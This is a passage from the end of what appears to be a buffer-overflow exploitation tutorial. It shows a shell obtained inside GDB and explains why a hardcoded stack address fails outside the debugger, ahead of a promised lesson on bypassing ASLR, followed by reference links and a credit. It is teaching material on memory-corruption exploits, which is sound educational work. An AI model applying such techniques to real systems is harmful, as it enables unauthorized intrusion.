[Detaching after fork from child process 3379]
README.md  bof  bof.c  test
$ echo "Buffer overflows are cool!"
Buffer overflows are cool!
$
```

Unfortunately, the exploit is unlikely to work outside of GDB because stack addresses are usually different outside of GDB. GDB tends to add extra parameters to the stack for some reason, which causes the stack addresses to be different than if you had executed the program outside of GDB. Our exploit had relied on a hardcoded address that only worked inside of GDB, but we'll get into how we can make our exploits work without using hardcoded memory addresses when we discuss bypassing ASLR.

## Practice:
- TODO: Get a TCTF challenge here.

## More Resources:
- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- [Stack Frame](https://en.citizendium.org/wiki/Stack_frame)
- [x86_64 Calling Convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf)
- [GDB User Manual](https://sourceware.org/gdb/current/onlinedocs/gdb/)
- [GEF Documentation](https://gef.readthedocs.io/en/master/)

## Creators

**Nihaal Prasad**

Enjoy :metal:
